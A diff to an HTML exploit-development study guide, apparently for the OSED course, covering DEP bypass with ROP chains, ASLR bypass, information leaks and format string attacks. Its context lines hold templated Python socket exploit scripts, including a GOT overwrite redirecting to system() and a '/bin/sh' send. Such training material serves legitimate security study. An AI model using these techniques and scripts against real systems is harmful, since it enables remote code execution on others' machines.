-    <li><label><input type="checkbox"> rop_suggestions.txt — useful categorized gadgets</label></li>
+    <li><label><input type="checkbox"> rop.txt           - all individual gadgets</label></li>
+    <li><label><input type="checkbox"> rop_chains.txt    - pre-built API call chains</label></li>
+    <li><label><input type="checkbox"> rop_suggestions.txt - useful categorized gadgets</label></li>
     </ul>
   </li>
   <li>
@@ -3850,7 +3848,7 @@ grep "mov ecx, eax" gadgets.txt</code></pre>
     <li><label><input type="checkbox"> 0x[gadget-address]+1: ret</label></li>
     <li><label><input type="checkbox"> Dirty gadget (has side effects):</label></li>
     <li><label><input type="checkbox"> 0x[gadget-address]: pop eax</label></li>
-    <li><label><input type="checkbox"> 0x[gadget-address]+1: pop ebx    ← unintended pop — need a dummy value on stack</label></li>
+    <li><label><input type="checkbox"> 0x[gadget-address]+1: pop ebx    ← unintended pop - need a dummy value on stack</label></li>
     <li><label><input type="checkbox"> 0x[gadget-address]+2: ret</label></li>
     </ul>
   </li>
@@ -3869,7 +3867,7 @@ grep "mov ecx, eax" gadgets.txt</code></pre>
 
 <p>VirtualProtect changes the memory protection on existing pages. By calling <code>VirtualProtect(lpAddress, dwSize, PAGE_EXECUTE_READWRITE, &lpflOldProtect)</code> on the stack region containing shellcode, DEP is effectively disabled for that memory range. The shellcode can then execute normally. This is the most common DEP bypass because it does not require allocating new memory or writing to arbitrary addresses.</p>
 
-<p>The ROP chain must place four arguments on the stack in the correct order, then transfer execution to VirtualProtect. The challenge is that several arguments are dynamic — <code>lpAddress</code> should point to the shellcode, and <code>lpflOldProtect</code> needs a writable address for the output parameter. The PUSHAD technique simplifies this by using register-loading gadgets followed by a single PUSHAD instruction that pushes all eight general-purpose registers onto the stack in the correct order for the API call.</p>
+<p>The ROP chain must place four arguments on the stack in the correct order, then transfer execution to VirtualProtect. The challenge is that several arguments are dynamic - <code>lpAddress</code> should point to the shellcode, and <code>lpflOldProtect</code> needs a writable address for the output parameter. The PUSHAD technique simplifies this by using register-loading gadgets followed by a single PUSHAD instruction that pushes all eight general-purpose registers onto the stack in the correct order for the API call.</p>
 
 <table class="custom-table">
 <thead><tr><th>Parameter</th><th>Value</th><th>ROP Strategy</th></tr></thead>
@@ -3987,6 +3985,7 @@ dd esp L10   # verify stack layout matches expectations</code></pre>
 <h3 id="rop-virtualalloc">8.5 Building a VirtualAlloc ROP Chain</h3>
 
 <p>VirtualAlloc allocates a new block of memory with the specified protection flags. By calling <code>VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)</code> with <code>flProtect=PAGE_EXECUTE_READWRITE</code>, the chain creates a fresh RWX memory region. Shellcode is then copied to this region and execution transfers there. This approach avoids modifying the protection of existing pages, which some security products monitor.</p>
+<figure><img src="./img/osed/fig139-grabbing-virtualalloc-address-from-the-iat.png" alt="Grabbing VirtualAlloc address from the IAT"></figure>
 
 <p>The chain is more complex than VirtualProtect because after allocation, the shellcode must be copied from the stack into the new memory. This requires an additional memcpy-equivalent ROP sequence or a <code>REP MOVS</code> gadget chain. Alternatively, combine VirtualAlloc with a return-to-shellcode by making <code>lpAddress</code> a predictable value and placing shellcode at a known stack offset.</p>
 
@@ -4017,7 +4016,7 @@ p = lambda x: struct.pack("&lt;I", x)
 
 # VirtualAlloc parameters on the stack:
 # [VirtualAlloc address]
-# [return address — where to go after allocation]
+# [return address - where to go after allocation]
 # [lpAddress = 0]
 # [dwSize = 0x1000]
 # [flAllocationType = 0x1000]
@@ -4068,9 +4067,9 @@ db eax L100    # Should be zeroed initially</code></pre>
 
 <h3 id="rop-writeprocessmemory">8.6 Building a WriteProcessMemory ROP Chain</h3>
 
-<p>WriteProcessMemory writes data from the current process into a specified memory location within the same process. The key advantage is that the destination can be an existing executable section — the <code>.text</code> section of a loaded module that already has execute permission. This avoids changing page protections entirely and is the stealthiest DEP bypass because no pages change their protection attributes.</p>
+<p>WriteProcessMemory writes data from the current process into a specified memory location within the same process. The key advantage is that the destination can be an existing executable section - the <code>.text</code> section of a loaded module that already has execute permission. This avoids changing page protections entirely and is the stealthiest DEP bypass because no pages change their protection attributes.</p>
 
-<p>The function signature is <code>WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, *lpNumberOfBytesWritten)</code>. Setting <code>hProcess</code> to <code>-1</code> (pseudo-handle for the current process) simplifies the call. The <code>lpBaseAddress</code> should point to a code cave — an unused region within an executable section — and <code>lpBuffer</code> points to the shellcode on the stack.</p>
+<p>The function signature is <code>WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, *lpNumberOfBytesWritten)</code>. Setting <code>hProcess</code> to <code>-1</code> (pseudo-handle for the current process) simplifies the call. The <code>lpBaseAddress</code> should point to a code cave - an unused region within an executable section - and <code>lpBuffer</code> points to the shellcode on the stack.</p>
 
 <table class="custom-table">
 <thead><tr><th>Parameter</th><th>Value</th><th>Notes</th></tr></thead>
@@ -4229,7 +4228,7 @@ for i, addr in enumerate(rop_gadgets):
 
 <h3 id="rop-to-shellcode">8.8 Chaining ROP to Shellcode Execution</h3>
 
-<p>The final step connects the ROP chain to shellcode execution. After VirtualProtect marks the stack as executable, the chain needs a clean transition to the shellcode bytes. The PUSHAD technique handles this naturally — after PUSHAD sets up the VirtualProtect parameters and the call executes, VirtualProtect returns to the address stored in EBP (set to a JMP ESP gadget), which jumps to the shellcode immediately following on the stack.</p>
+<p>The final step connects the ROP chain to shellcode execution. After VirtualProtect marks the stack as executable, the chain needs a clean transition to the shellcode bytes. The PUSHAD technique handles this naturally - after PUSHAD sets up the VirtualProtect parameters and the call executes, VirtualProtect returns to the address stored in EBP (set to a JMP ESP gadget), which jumps to the shellcode immediately following on the stack.</p>
 
 <p>The complete exploit structure is: padding (to reach saved EIP) → first gadget address (overwrites EIP) → ROP chain (sets up API call) → NOP sled (optional alignment) → shellcode. If the total payload exceeds the available overflow space, consider using a staged payload or an egghunter as shellcode to locate a larger second-stage payload elsewhere in memory.</p>
 
@@ -4375,11 +4374,11 @@ python3 exploit.py
 
 <h3 id="aslr-theory">9.1 ASLR Theory and Implementation</h3>
 
-<p>Address Space Layout Randomization (ASLR) randomizes the base addresses of executables, DLLs, the stack, and the heap each time a process starts (or each boot on older Windows versions). On Windows, ASLR is enabled per-module via the <code>/DYNAMICBASE</code> linker flag and enforced by the kernel's memory manager. The entropy varies by region — image bases receive 8 bits of randomization (256 possible positions) in 32-bit processes, while the stack and heap receive higher entropy. On 64-bit systems, ASLR entropy increases dramatically to 17+ bits for images and 24+ bits for the stack.</p>
+<p>Address Space Layout Randomization (ASLR) randomizes the base addresses of executables, DLLs, the stack, and the heap each time a process starts (or each boot on older Windows versions). On Windows, ASLR is enabled per-module via the <code>/DYNAMICBASE</code> linker flag and enforced by the kernel's memory manager. The entropy varies by region - image bases receive 8 bits of randomization (256 possible positions) in 32-bit processes, while the stack and heap receive higher entropy. On 64-bit systems, ASLR entropy increases dramatically to 17+ bits for images and 24+ bits for the stack.</p>
 
-<p>Windows Vista and later enable ASLR by default for all system DLLs and executables compiled with <code>/DYNAMICBASE</code>. Older third-party modules or applications compiled without this flag retain fixed base addresses across reboots, which creates a critical weakness — any single non-ASLR module in the process address space provides a stable foothold for gadgets and return addresses.</p>
+<p>Windows Vista and later enable ASLR by default for all system DLLs and executables compiled with <code>/DYNAMICBASE</code>. Older third-party modules or applications compiled without this flag retain fixed base addresses across reboots, which creates a critical weakness - any single non-ASLR module in the process address space provides a stable foothold for gadgets and return addresses.</p>
 
-<p>Windows Defender Exploit Guard (WDEG) can enforce mandatory ASLR — forcing randomization on modules that were not compiled with <code>/DYNAMICBASE</code>. When enabled, WDEG overrides the module's PE header and applies ASLR regardless. Check the system-wide WDEG ASLR policy with <code>Get-ProcessMitigation -System</code> and per-process overrides with <code>Get-ProcessMitigation -Name [process].exe</code>. If mandatory ASLR is active, previously "non-ASLR" modules are no longer reliable gadget sources, and the exploit must use an information leak instead.</p>
+<p>Windows Defender Exploit Guard (WDEG) can enforce mandatory ASLR - forcing randomization on modules that were not compiled with <code>/DYNAMICBASE</code>. When enabled, WDEG overrides the module's PE header and applies ASLR regardless. Check the system-wide WDEG ASLR policy with <code>Get-ProcessMitigation -System</code> and per-process overrides with <code>Get-ProcessMitigation -Name [process].exe</code>. If mandatory ASLR is active, previously "non-ASLR" modules are no longer reliable gadget sources, and the exploit must use an information leak instead.</p>
 
 <table class="custom-table">
 <thead><tr><th>Region</th><th>32-bit Entropy</th><th>64-bit Entropy</th><th>Randomization Granularity</th></tr></thead>
@@ -4397,7 +4396,7 @@ python3 exploit.py
   <li>
     <label><input type="checkbox"> Check which modules have ASLR enabled in the process</label>
     <pre><code class="language-bash">0:000> !mona modules
-# Look at the "ASLR" column — True means randomized, False means fixed base</code></pre>
+# Look at the "ASLR" column - True means randomized, False means fixed base</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Verify ASLR status of a specific module with dumpbin</label>
@@ -4434,7 +4433,7 @@ print(f"Image base: 0x{pe.OPTIONAL_HEADER.ImageBase:08X}")</code></pre>
 
 <p>When a process loads even a single module compiled without <code>/DYNAMICBASE</code>, the attacker gains a fixed address range to source gadgets, return addresses, and JMP ESP instructions. These modules retain the same base address across reboots and process restarts, completely nullifying ASLR for exploit development against that module's code section. Common offenders include legacy third-party DLLs, application plugins, and older runtime components.</p>
 
-<p>The approach mirrors standard stack overflow exploitation — find a JMP ESP or equivalent instruction within the non-ASLR module, use it as the return address, and place shellcode on the stack. If DEP is also enabled, the non-ASLR module provides a stable source for ROP gadgets whose addresses remain predictable.</p>
+<p>The approach mirrors standard stack overflow exploitation - find a JMP ESP or equivalent instruction within the non-ASLR module, use it as the return address, and place shellcode on the stack. If DEP is also enabled, the non-ASLR module provides a stable source for ROP gadgets whose addresses remain predictable.</p>
 
 <table class="custom-table">
 <thead><tr><th>Mona Command</th><th>Purpose</th></tr></thead>
@@ -4457,7 +4456,7 @@ print(f"Image base: 0x{pe.OPTIONAL_HEADER.ImageBase:08X}")</code></pre>
   <li>
     <label><input type="checkbox"> Find JMP ESP gadgets within the non-ASLR module</label>
     <pre><code class="language-bash">0:000> !mona jmp -r esp -m "[target-module].dll"
-# Returns addresses like 0x10012A45 — these remain fixed</code></pre>
+# Returns addresses like 0x10012A45 - these remain fixed</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Verify the gadget address contains no bad characters</label>
@@ -4502,16 +4501,16 @@ s.close()</code></pre>
 
 <h3 id="partial-eip-overwrite">9.3 Partial EIP Overwrite</h3>
 
-<p>When ASLR randomizes a module's base address, the lower bytes of code addresses within that module remain relatively stable — only the higher-order bytes change. A partial EIP overwrite exploits this by overwriting only the least significant 1 or 2 bytes of the saved return address on the stack, leaving the upper bytes intact. This constrains the redirect to stay within the same module where the return address already points, avoiding the need to know the full randomized base address.</p>
+<p>When ASLR randomizes a module's base address, the lower bytes of code addresses within that module remain relatively stable - only the higher-order bytes change. A partial EIP overwrite exploits this by overwriting only the least significant 1 or 2 bytes of the saved return address on the stack, leaving the upper bytes intact. This constrains the redirect to stay within the same module where the return address already points, avoiding the need to know the full randomized base address.</p>
 
 <p>The technique requires precise control of the overflow length. Instead of overwriting all 4 bytes of the saved EIP, the attacker writes exactly 1 or 2 bytes, redirecting execution to a useful gadget whose low-order address bytes are known. The effectiveness depends on how many useful gadgets exist within the reachable address range (256 locations for a 1-byte overwrite, 65536 for 2 bytes).</p>
 
 <table class="custom-table">
 <thead><tr><th>Overwrite Size</th><th>Range</th><th>Addresses Reachable</th><th>ASLR Bypassed</th></tr></thead>
 <tbody>
-<tr><td>1 byte</td><td>0x00 — 0xFF offset from original</td><td>256</td><td>If target gadget is within range</td></tr>
-<tr><td>2 bytes</td><td>0x0000 — 0xFFFF offset from original</td><td>65,536</td><td>Covers the full module code section</td></tr>
-<tr><td>3 bytes</td><td>0x000000 — 0xFFFFFF</td><td>16,777,216</td><td>Crosses module boundaries (less useful)</td></tr>
+<tr><td>1 byte</td><td>0x00 - 0xFF offset from original</td><td>256</td><td>If target gadget is within range</td></tr>
+<tr><td>2 bytes</td><td>0x0000 - 0xFFFF offset from original</td><td>65,536</td><td>Covers the full module code section</td></tr>
+<tr><td>3 bytes</td><td>0x000000 - 0xFFFFFF</td><td>16,777,216</td><td>Crosses module boundaries (less useful)</td></tr>
 </tbody>
 </table>
 
@@ -4521,7 +4520,7 @@ s.close()</code></pre>
     <label><input type="checkbox"> Determine the exact offset to the saved return address</label>
     <pre><code class="language-bash">0:000> !mona pattern_create 2000
 0:000> !mona pattern_offset [eip-value]
-# Note the exact offset — you must overwrite ONLY the lower bytes</code></pre>
+# Note the exact offset - you must overwrite ONLY the lower bytes</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Identify a useful gadget within the same module at a known low-byte offset</label>
@@ -4549,9 +4548,9 @@ s.close()</code></pre>
     <pre><code class="language-bash">0:000> dd esp L1
 0:000> dd esp L1</code></pre>
     <ul class="methodology-checklist">
-    <li><label><input type="checkbox"> Before overflow — saved EIP on stack:</label></li>
+    <li><label><input type="checkbox"> Before overflow - saved EIP on stack:</label></li>
     <li><label><input type="checkbox"> Shows: 0x[XX][YY][original-low-bytes]</label></li>
-    <li><label><input type="checkbox"> After overflow — only low bytes modified:</label></li>
+    <li><label><input type="checkbox"> After overflow - only low bytes modified:</label></li>
     <li><label><input type="checkbox"> Shows: 0x[XX][YY][overwritten-low-bytes]</label></li>
     </ul>
   </li>
@@ -4559,13 +4558,13 @@ s.close()</code></pre>
     <label><input type="checkbox"> Ensure the payload length does not overwrite beyond the return address</label>
     <pre><code class="language-python"># The buffer must be EXACTLY offset + 2 bytes (for 2-byte partial overwrite)
 # Any additional bytes will corrupt the stack frame above and break execution
-assert len(payload) == offset + 2, "Payload length mismatch — partial overwrite requires exact sizing"</code></pre>
+assert len(payload) == offset + 2, "Payload length mismatch - partial overwrite requires exact sizing"</code></pre>
   </li>
 </ul>
 
 <h3 id="info-leaks">9.4 Information Leaks</h3>
 
-<p>Information leaks expose runtime addresses — stack pointers, heap addresses, or module base addresses — through application responses, error messages, or side channels. On Windows, applications that echo back portions of uninitialized stack memory, return verbose error messages with pointer values, or use format string vulnerabilities can all leak addresses that defeat ASLR. Once an attacker obtains a single address from within an ASLR-enabled module, the module's base can be calculated by subtracting the known offset, and all gadget addresses within that module become predictable.</p>
+<p>Information leaks expose runtime addresses - stack pointers, heap addresses, or module base addresses - through application responses, error messages, or side channels. On Windows, applications that echo back portions of uninitialized stack memory, return verbose error messages with pointer values, or use format string vulnerabilities can all leak addresses that defeat ASLR. Once an attacker obtains a single address from within an ASLR-enabled module, the module's base can be calculated by subtracting the known offset, and all gadget addresses within that module become predictable.</p>
 
 <p>Common leak sources include server banners that include memory addresses, debug output left in production builds, stack-based buffer reads that return more data than was written (reading uninitialized stack bytes), and format string vulnerabilities that dump stack contents. Network protocols that reflect data often expose adjacent stack values containing return addresses or saved frame pointers.</p>
 
@@ -4602,7 +4601,8 @@ s.close()
 
 response = s.recv(4096)
 # Assume the leaked address starts at byte offset [leak-offset] in the response
-leaked_addr = struct.unpack("&lt;I", response[[leak-offset]:[leak-offset]+4])[0]
+leak_offset = [leak-offset]
+leaked_addr = struct.unpack("&lt;I", response[leak_offset:leak_offset+4])[0]
 print(f"Leaked address: 0x{leaked_addr:08X}")</code></pre>
   </li>
   <li>
@@ -4632,7 +4632,8 @@ s.close()</code></pre>
     s.connect(("[target-ip]", [target-port]))
     s.send(b"AAAA\n")
     resp = s.recv(4096)
-    leaked = struct.unpack("&lt;I", resp[[leak-offset]:[leak-offset]+4])[0]
+    leak_offset = [leak-offset]
+    leaked = struct.unpack("&lt;I", resp[leak_offset:leak_offset+4])[0]
     print(f"Run {i}: leaked 0x{leaked:08X}")
     s.close()
 # If the low 16 bits are constant but high bytes change, ASLR is active and the offset is stable</code></pre>
@@ -4669,7 +4670,7 @@ s.close()</code></pre>
     </ul>
   </li>
   <li>
-    <label><input type="checkbox"> Build the two-stage exploit — leak, then overflow</label>
+    <label><input type="checkbox"> Build the two-stage exploit - leak, then overflow</label>
     <pre><code class="language-python">import struct, socket
 
 def leak_base(target_ip, target_port):
@@ -4677,7 +4678,8 @@ def leak_base(target_ip, target_port):
     s.connect((target_ip, target_port))
     s.send(b"[leak-trigger-payload]\n")
     resp = s.recv(4096)
-    leaked_addr = struct.unpack("&lt;I", resp[[leak-offset]:[leak-offset]+4])[0]
+    leak_offset = [leak-offset]
+    leaked_addr = struct.unpack("&lt;I", resp[leak_offset:leak_offset+4])[0]
     s.close()
     module_base = leaked_addr - [static-offset]
     return module_base
@@ -4732,7 +4734,8 @@ s.connect(("[target-ip]", [target-port]))
 # Stage 1: trigger leak
 s.send(b"[leak-command]\n")
 resp = s.recv(4096)
-base = struct.unpack("&lt;I", resp[[leak-offset]:[leak-offset]+4])[0] - [static-offset]
+leak_offset = [leak-offset]
+base = struct.unpack("&lt;I", resp[leak_offset:leak_offset+4])[0] - [static-offset]
 print(f"Base: 0x{base:08X}")
 
 # Stage 2: send exploit on the same connection
@@ -4827,7 +4830,7 @@ for attempt in range(1, 2000):
 
 <p>When bad characters prevent placing raw shellcode in the exploit buffer, build a ROP chain that decodes the shellcode at runtime. Instead of sending the final shellcode directly, encode each DWORD of the shellcode into values that avoid all bad characters, then use ROP gadgets to decode and write them to an executable memory region one DWORD at a time. This technique is essential when the buffer filter removes bytes like <code>0x00</code>, <code>0x0a</code>, <code>0x0d</code>, or <code>0x20</code> that appear in the shellcode.</p>
 
-<p>The encoding strategy uses SUB or ADD complements. For each 4-byte DWORD of shellcode, find two or three values that, when subtracted from each other (or added), produce the target DWORD — and ensure none of the operand bytes are bad characters. The ROP chain then executes a sequence: zero a register, subtract the complement values, and write the result to the target address. By repeating this for every DWORD and incrementing the target pointer, the entire shellcode is reconstructed in clean memory.</p>
+<p>The encoding strategy uses SUB or ADD complements. For each 4-byte DWORD of shellcode, find two or three values that, when subtracted from each other (or added), produce the target DWORD - and ensure none of the operand bytes are bad characters. The ROP chain then executes a sequence: zero a register, subtract the complement values, and write the result to the target address. By repeating this for every DWORD and incrementing the target pointer, the entire shellcode is reconstructed in clean memory.</p>
 
 <table class="custom-table">
 <thead><tr><th>Step</th><th>ROP Gadget Sequence</th><th>Purpose</th></tr></thead>
@@ -4954,7 +4957,7 @@ rop += p(0x[decode-target])     # could also use a JMP EDI gadget</code></pre>
 
 <p>A format string vulnerability occurs when user-controlled input is passed directly as the format string argument to a <code>printf</code>-family function (<code>printf</code>, <code>sprintf</code>, <code>fprintf</code>, <code>snprintf</code>, <code>wprintf</code>). Normally, these functions expect the programmer to supply a fixed format string with specifiers (<code>%x</code>, <code>%s</code>, <code>%d</code>, <code>%n</code>, <code>%p</code>) and corresponding arguments on the stack. When the format string itself comes from the attacker, they control which specifiers are processed, and the function reads (or writes) stack memory that was never intended to be accessible.</p>
 
-<p>The root cause is passing user input as the first argument: <code>printf(user_input)</code> instead of <code>printf("%s", user_input)</code>. In the vulnerable case, each format specifier in the user's input causes <code>printf</code> to consume the next value from the stack as though it were a corresponding argument. Since no actual arguments exist beyond the format string pointer, the function reads whatever happens to be on the stack — saved registers, return addresses, local variables, and frame pointers.</p>
+<p>The root cause is passing user input as the first argument: <code>printf(user_input)</code> instead of <code>printf("%s", user_input)</code>. In the vulnerable case, each format specifier in the user's input causes <code>printf</code> to consume the next value from the stack as though it were a corresponding argument. Since no actual arguments exist beyond the format string pointer, the function reads whatever happens to be on the stack - saved registers, return addresses, local variables, and frame pointers.</p>
 
 <table class="custom-table">
 <thead><tr><th>Specifier</th><th>Expected Argument</th><th>Effect</th></tr></thead>
@@ -4966,7 +4969,7 @@ rop += p(0x[decode-target])     # could also use a JMP EDI gadget</code></pre>
 <tr><td><code>%n</code></td><td>int pointer</td><td>Writes the number of bytes printed so far to the address pointed to by the next stack DWORD</td></tr>
 <tr><td><code>%hn</code></td><td>short pointer</td><td>Writes the count (mod 65536) as a 2-byte short to the target address</td></tr>
 <tr><td><code>%hhn</code></td><td>char pointer</td><td>Writes the count (mod 256) as a single byte</td></tr>
-<tr><td><code>%N$x</code></td><td>Nth stack DWORD</td><td>Direct parameter access — reads the Nth argument position</td></tr>
+<tr><td><code>%N$x</code></td><td>Nth stack DWORD</td><td>Direct parameter access - reads the Nth argument position</td></tr>
 </tbody>
 </table>
 
@@ -4998,12 +5001,12 @@ s.close()
   </li>
   <li>
     <label><input type="checkbox"> Differentiate between vulnerable and safe usage in source code</label>
-    <pre><code class="language-c">// VULNERABLE — user input IS the format string
+    <pre><code class="language-c">// VULNERABLE - user input IS the format string
 char buf[256];
 recv(sock, buf, sizeof(buf), 0);
 printf(buf);         // Attacker controls specifiers
 
-// SAFE — user input is an argument, not the format string
+// SAFE - user input is an argument, not the format string
 char buf[256];
 recv(sock, buf, sizeof(buf), 0);
 printf("%s", buf);   // Fixed format string, user input is just data</code></pre>
@@ -5015,16 +5018,16 @@ s.connect(("[target-ip]", [target-port]))
 s.send(b"%s%s%s%s%s%s%s%s\n")
 try:
     response = s.recv(4096)
-    print(f"No crash — response: {response}")
+    print(f"No crash - response: {response}")
 except:
-    print("Service crashed — format string vulnerability confirmed with %s dereference")
+    print("Service crashed - format string vulnerability confirmed with %s dereference")
 s.close()</code></pre>
   </li>
 </ul>
 
 <h3 id="reading-stack">10.2 Reading the Stack with %x and %p</h3>
 
-<p>Each <code>%x</code> or <code>%p</code> specifier in the format string causes <code>printf</code> to consume the next DWORD from the stack and print it. By sending a string of <code>%x</code> specifiers, the attacker can read successive stack values — local variables, saved frame pointers, return addresses, and eventually their own input buffer. The point where the attacker's input appears on the stack is called the "format string offset" and is critical for constructing write payloads with <code>%n</code>.</p>
+<p>Each <code>%x</code> or <code>%p</code> specifier in the format string causes <code>printf</code> to consume the next DWORD from the stack and print it. By sending a string of <code>%x</code> specifiers, the attacker can read successive stack values - local variables, saved frame pointers, return addresses, and eventually their own input buffer. The point where the attacker's input appears on the stack is called the "format string offset" and is critical for constructing write payloads with <code>%n</code>.</p>
 
 <p>To find the offset, the attacker places a recognizable marker (like <code>AAAA</code> = <code>0x41414141</code>) at the beginning of the input, followed by enough <code>%x</code> specifiers to walk down the stack until <code>41414141</code> appears in the output. The position where this value appears (counting from 1) is the direct parameter access index used in later attacks.</p>
 
@@ -5173,7 +5176,7 @@ payload = specifier + padding + target_addr + b"\n"</code></pre>
   </li>
 </ul>
 
-<p>In practice, the read primitive often works through an application feature that processes and returns user-controlled strings. In the EXP-301 lab, IBM Tivoli FastBackServer exposes an event log function that accepts protocol commands containing format specifiers, evaluates them through a <code>printf</code>-family call, and returns the formatted result to the client. The attacker sends <code>%p</code> or <code>%x</code> specifiers embedded in a protocol command, and the server's event log handler processes them — leaking stack contents, module base addresses, and return pointers in the response. Any application feature that echoes processed strings (debug output, error messages, logging responses) can serve as a format string read channel.</p>
+<p>In practice, the read primitive often works through an application feature that processes and returns user-controlled strings. In the EXP-301 lab, IBM Tivoli FastBackServer exposes an event log function that accepts protocol commands containing format specifiers, evaluates them through a <code>printf</code>-family call, and returns the formatted result to the client. The attacker sends <code>%p</code> or <code>%x</code> specifiers embedded in a protocol command, and the server's event log handler processes them - leaking stack contents, module base addresses, and return pointers in the response. Any application feature that echoes processed strings (debug output, error messages, logging responses) can serve as a format string read channel.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -5219,9 +5222,9 @@ for i, addr in enumerate(addrs):
 
 <h3 id="arbitrary-write-n">10.4 Arbitrary Write with %n</h3>
 
-<p>The <code>%n</code> specifier writes the number of characters printed so far to the address pointed to by the corresponding stack argument. By controlling the address on the stack (via the format string offset) and the number of characters printed (via padding specifiers like <code>%Nx</code>), the attacker achieves an arbitrary write primitive — writing a controlled value to a controlled address. This is the most powerful format string primitive and enables full code execution.</p>
+<p>The <code>%n</code> specifier writes the number of characters printed so far to the address pointed to by the corresponding stack argument. By controlling the address on the stack (via the format string offset) and the number of characters printed (via padding specifiers like <code>%Nx</code>), the attacker achieves an arbitrary write primitive - writing a controlled value to a controlled address. This is the most powerful format string primitive and enables full code execution.</p>
 
-<p>A 4-byte write with <code>%n</code> requires printing exactly the desired value's worth of characters before the <code>%n</code> specifier. For large values (like addresses in the 0x7XXXXXXX range), this means printing billions of characters — impractical and slow. The solution is <code>%hn</code> (2-byte short write) or <code>%hhn</code> (1-byte write), which only consider the lower 16 or 8 bits of the character count respectively, allowing precise value writes with manageable padding.</p>
+<p>A 4-byte write with <code>%n</code> requires printing exactly the desired value's worth of characters before the <code>%n</code> specifier. For large values (like addresses in the 0x7XXXXXXX range), this means printing billions of characters - impractical and slow. The solution is <code>%hn</code> (2-byte short write) or <code>%hhn</code> (1-byte write), which only consider the lower 16 or 8 bits of the character count respectively, allowing precise value writes with manageable padding.</p>
 
 <table class="custom-table">
 <thead><tr><th>Specifier</th><th>Write Size</th><th>Value Written</th><th>Max Padding Needed</th></tr></thead>
@@ -5248,7 +5251,7 @@ s.connect(("[target-ip]", [target-port]))
 payload = target_addr + f"%{offset}$n".encode() + b"\n"
 s.send(payload)
 s.close()
-# Verify in WinDbg: dd 0x[writable-address] — should contain 0x00000004</code></pre>
+# Verify in WinDbg: dd 0x[writable-address] - should contain 0x00000004</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Write a specific value using padding to control the character count</label>
@@ -5406,7 +5409,7 @@ payload = specifier_prefix + b"P" * alignment_padding + target_addr + b"\n"
 
 <h3 id="precise-writes">11.1 Precise Value Writes with %hn</h3>
 
-<p>Writing an arbitrary 4-byte value to an address requires two <code>%hn</code> writes — one for the lower 2 bytes and one for the upper 2 bytes. The format string must contain both target addresses (the base address and base+2), and two <code>%hn</code> specifiers with calculated padding to produce the desired byte values. The writes must be ordered from smallest to largest value to ensure the padding calculations produce positive numbers.</p>
+<p>Writing an arbitrary 4-byte value to an address requires two <code>%hn</code> writes - one for the lower 2 bytes and one for the upper 2 bytes. The format string must contain both target addresses (the base address and base+2), and two <code>%hn</code> specifiers with calculated padding to produce the desired byte values. The writes must be ordered from smallest to largest value to ensure the padding calculations produce positive numbers.</p>
 
 <p>The padding for each write is computed as <code>(desired_value - chars_already_printed) mod 65536</code>. Since the character count is cumulative across the entire format string, the second write's padding must account for all characters already output by the first write. Sorting the two half-word values from smallest to largest simplifies the calculation and avoids negative padding.</p>
 
@@ -5437,7 +5440,7 @@ hi_val = (value >> 16) &amp; 0xFFFF  # 0xDEAD
 addr_lo = struct.pack("&lt;I", target)
 addr_hi = struct.pack("&lt;I", target + 2)
 
-# Sort by value — write smaller value first
+# Sort by value - write smaller value first
 if lo_val &lt;= hi_val:
     first_addr, first_val, first_off = addr_lo, lo_val, offset
     second_addr, second_val, second_off = addr_hi, hi_val, offset + 1
@@ -5471,7 +5474,7 @@ s.close()</code></pre>
 # In that case, adjust: use %1x and subtract 1 from the next padding.
 
 if pad1 == 0:
-    # Already printed exactly the right number of chars — skip the padding
+    # Already printed exactly the right number of chars - skip the padding
     payload  = first_addr + second_addr
     payload += f"%{first_off}$hn".encode()
     payload += f"%{pad2}x%{second_off}$hn".encode()
@@ -5508,7 +5511,7 @@ if pad1 == 0:
 
 <p>On Linux, dynamically linked functions are resolved through the Procedure Linkage Table (PLT) and Global Offset Table (GOT). The first time a function like <code>printf</code> is called, the PLT stub redirects to the dynamic linker, which resolves the function's real address and writes it into the GOT entry. Subsequent calls read the resolved address directly from the GOT. Overwriting a GOT entry with a format string replaces the resolved function address with an attacker-controlled address, redirecting execution whenever the function is next called.</p>
 
-<p>The attacker finds the GOT address of a frequently called function (such as <code>printf</code>, <code>puts</code>, or <code>exit</code>) using <code>objdump -R</code> or <code>readelf -r</code>, then uses the <code>%hn</code> write primitive to overwrite the GOT entry with the address of shellcode, a <code>system()</code> call, or a stack pivot gadget. The overwrite takes effect immediately — the next call to the target function jumps to the attacker's address.</p>
+<p>The attacker finds the GOT address of a frequently called function (such as <code>printf</code>, <code>puts</code>, or <code>exit</code>) using <code>objdump -R</code> or <code>readelf -r</code>, then uses the <code>%hn</code> write primitive to overwrite the GOT entry with the address of shellcode, a <code>system()</code> call, or a stack pivot gadget. The overwrite takes effect immediately - the next call to the target function jumps to the attacker's address.</p>
 
 <table class="custom-table">
 <thead><tr><th>Command</th><th>Purpose</th></tr></thead>
@@ -5575,7 +5578,7 @@ s.send(b"/bin/sh\n")   # This string is now passed to system()
 
 <h3 id="win-function-pointers">11.3 Overwriting Function Pointers on Windows</h3>
 
-<p>Windows executables do not use the GOT/PLT mechanism, but equivalent targets exist: SEH handler pointers on the stack, function pointers stored in global data sections (<code>.data</code>, <code>.bss</code>), callback function pointers in heap-allocated structures, and virtual function table (vtable) pointers in C++ objects. The Import Address Table (IAT) serves a similar role to the GOT — it holds resolved addresses of imported functions and can be overwritten to redirect API calls.</p>
+<p>Windows executables do not use the GOT/PLT mechanism, but equivalent targets exist: SEH handler pointers on the stack, function pointers stored in global data sections (<code>.data</code>, <code>.bss</code>), callback function pointers in heap-allocated structures, and virtual function table (vtable) pointers in C++ objects. The Import Address Table (IAT) serves a similar role to the GOT - it holds resolved addresses of imported functions and can be overwritten to redirect API calls.</p>
 
 <p>On the Windows stack, each SEH frame contains a pointer to the exception handler function. Overwriting this pointer with a format string write causes the handler to execute attacker-controlled code when an exception is raised. The SEH chain is accessible at <code>fs:[0]</code> on 32-bit Windows, and each node is an <code>_EXCEPTION_REGISTRATION_RECORD</code> with a <code>Handler</code> field at offset +4. Application-specific function pointer tables in <code>.data</code> sections are also viable targets.</p>
 
@@ -5717,11 +5720,11 @@ for val, off, _ in writes:
 payload += b"\n"
 
 s.send(payload)
-# Keep the connection open — the next input goes to the overwritten function</code></pre>
+# Keep the connection open - the next input goes to the overwritten function</code></pre>
   </li>
   <li>
